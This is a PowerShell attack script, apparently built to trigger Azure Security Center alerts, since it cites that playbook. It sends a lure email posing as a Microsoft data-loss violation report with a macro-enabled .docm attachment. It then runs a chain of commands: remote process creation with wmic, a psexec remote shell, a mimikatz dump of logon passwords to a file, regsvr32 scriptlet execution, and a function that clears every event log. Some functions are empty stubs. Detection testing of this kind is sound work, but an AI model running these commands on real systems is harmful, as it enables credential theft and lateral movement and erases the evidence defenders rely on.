#executes phishing attack
function SendEmail($userEmail)
{
    $password = "#PASSWORD#" | ConvertTo-SecureString

    $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "#USERNAME#", $password;

    ## Define the Send-MailMessage parameters
    $mailParams = @{
        SmtpServer                 = 'smtp.office365.com'
        Port                       = '587' # or '25' if not using TLS
        UseSSL                     = $true ## or not if using non-TLS
        Credential                 = $credential
        From                       = '#USERNAME#'
        To                         = '#USERNAME#'
        Subject                    = "Microsoft eDiscovery Report - Violation"
        Body                       = 'Data Loss Protection has found outbound mail with PII information'
        DeliveryNotificationOption = 'OnFailure', 'OnSuccess'
        Attachments                = 'DataLossReport.docm'
    }

    ## Send the message
    Send-MailMessage @mailParams;   
}

function ExecuteDocm()
{
    #execute the docm (manually)

    #execute an in-memory powershell attack
    $data = get-content "data.txt";

    #once that is executed...we can do more!
    DownloadMimikatz;

    #use all this awesome access we now have!
    GoLateral;
}

function DownloadMimikatz()
{
    #try to go lateral

    GoLateral;
}

function GoLateral()
{
    #connect to another machine

}

function clear-all-event-logs ($computerName="localhost")
{
   $logs = Get-EventLog -ComputerName $computername -List | ForEach-Object {$_.Log}
   $logs | ForEach-Object {Clear-EventLog -ComputerName $computername -LogName $_ }
   Get-EventLog -ComputerName $computername -list
}

$userEmail = "{username}";

SendEmail $userEmail;

#Run the attack
wmic /node:"targetcomputer" process call create "cmd.exe /c copy c:\windows\system32\svchost.exe c:\job\svchost.exe";

wmic /node:"targetcomputer" process call create "cmd.exe /c c:\job\svchost.exe";

cd c:/tools;

psexec /accepteula \\targetcomputer cmd

hostname

mimikatz.exe "priviledge::debug" "sekurlsa::logonpasswords" "exit" >> c:\tools\target-pc.txt

regsvr32.exe /s /u /i:test.sct scrobj.dll

regsvr32.exe /s /u /i:test.sct PrintIsolationProxy.dll

clear-all-event-logs

#referece
#https://github.com/Azure/Azure-Security-Center/blob/main/Simulations/Azure%20Security%20Center%20Security%20Alerts%20Playbook_v2.pdf